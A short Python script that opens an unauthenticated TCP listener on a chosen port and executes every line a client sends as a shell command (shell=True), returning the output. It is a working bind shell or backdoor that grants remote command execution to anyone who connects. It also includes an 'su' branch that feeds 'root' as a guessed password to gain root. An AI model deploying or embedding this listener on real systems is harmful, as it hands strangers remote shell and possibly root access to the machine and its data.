import socket
import subprocess

HOST = ''
PORT = int(input("Enter the port U want to listen on= "))

try:
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f'Listening on {HOST}:{PORT}...')
except Exception as e:
    print(f'Failed to bind to {HOST}:{PORT} - {str(e)}')
    exit(1)

while True:
    try:
        client_socket, client_address = server_socket.accept()
        print(f'Accepted connection from {client_address[0]}:{client_address[1]}')
        message = 'Welcome to my Python listener!\n'
        client_socket.send(message.encode())

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            command = data.decode().strip()
            try:
                if command == 'exit':
                    break
                elif command == 'su':
                    prompt = '# '
                    process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    process.stdin.write(b'root\n')
                    process.stdin.flush()
                else:
                    prompt = '$ '
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                while True:
                    output = process.stdout.readline() + process.stderr.readline()
                    if output == b'' and process.poll() is not None:
                        break
                    if output:
                        print(f'Sending output: {output.decode()}')
                        client_socket.send(output)
                client_socket.send(prompt.encode())
            except Exception as e:
                print(f'Error executing command {command} - {str(e)}')
                client_socket.send(f'Error executing command {command}'.encode())
    except KeyboardInterrupt:
        print('Stopping listener due to keyboard interrupt')
        break
    except Exception as e:
        print(f'Error accepting connection - {str(e)}')

server_socket.close()
